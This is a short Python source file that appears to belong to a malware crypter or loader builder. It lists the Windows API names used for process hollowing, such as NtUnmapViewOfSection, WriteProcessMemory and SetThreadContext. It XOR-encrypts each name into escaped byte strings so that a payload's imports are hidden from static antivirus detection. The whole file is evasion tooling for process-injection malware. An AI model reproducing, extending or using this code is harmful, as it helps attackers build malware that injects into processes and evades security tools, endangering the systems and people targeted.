import binascii
from itertools import cycle
from operator import xor
import re


imports = ['kernel32.dll', 'ntdll.dll', 'CreateProcessA', 'NtUnmapViewOfSection', 'VirtualAllocEx',
           'WriteProcessMemory', 'VirtualProtectEx', 'GetThreadContext', 'SetThreadContext', 'ResumeThread',
           'ReadProcessMemory']


def decode_key(key):
    if isinstance(key, bytearray):
        return key.decode("unicode_escape")
    hex = str(binascii.hexlify(key), 'ascii')
    return "\\x{}".format('\\x'.join(hex[i:i + 2] for i in range(0, len(hex), 2)))


def encrypt(key, data):
    return bytearray(map(xor, data, cycle(key)))


def decode_data(data):
    hex = str(binascii.hexlify(data), 'ascii')
    return "\\x{}".format('\\x'.join(hex[i:i + 2] for i in range(0, len(hex), 2)))


def camelcase_to_underscore(name):
    s1 = re.sub('(.)([A-Z][a-z]+)', r'\1_\2', name)
    return re.sub('([a-z0-9])([A-Z])', r'\1_\2', s1).lower()


def get_encrypted_imports(key):
    encrypted_imports = {}
    for import_string in imports:
        encrypted_import_name = camelcase_to_underscore(import_string.replace(".dll", ""))
        encrypted_import = decode_data(encrypt(key, bytearray(import_string, encoding="utf-8")))
        encrypted_imports["encrypted_{}".format(encrypted_import_name)] = encrypted_import
    return encrypted_imports
